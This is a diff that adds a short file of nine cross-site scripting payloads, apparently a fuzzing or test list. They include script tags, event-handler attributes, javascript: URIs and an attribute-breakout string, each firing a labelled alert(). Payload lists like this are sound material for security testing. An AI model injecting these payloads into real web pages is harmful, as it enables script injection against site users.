@@ -1,0 +1,9 @@
+<script>alert('XSS1')</script>
+<img src=x onerror=alert('XSS2')>
+'"><script>alert('XSS3')</script>
+<svg/onload=alert('XSS4')>
+javascript:alert('XSS5')
+<body onload=alert('XSS6')>
+<iframe src=javascript:alert('XSS7')>
+<input type='text' value='<' onfocus=alert('XSS8')>
+<div style='background:url(javascript:alert("XSS9"))'>
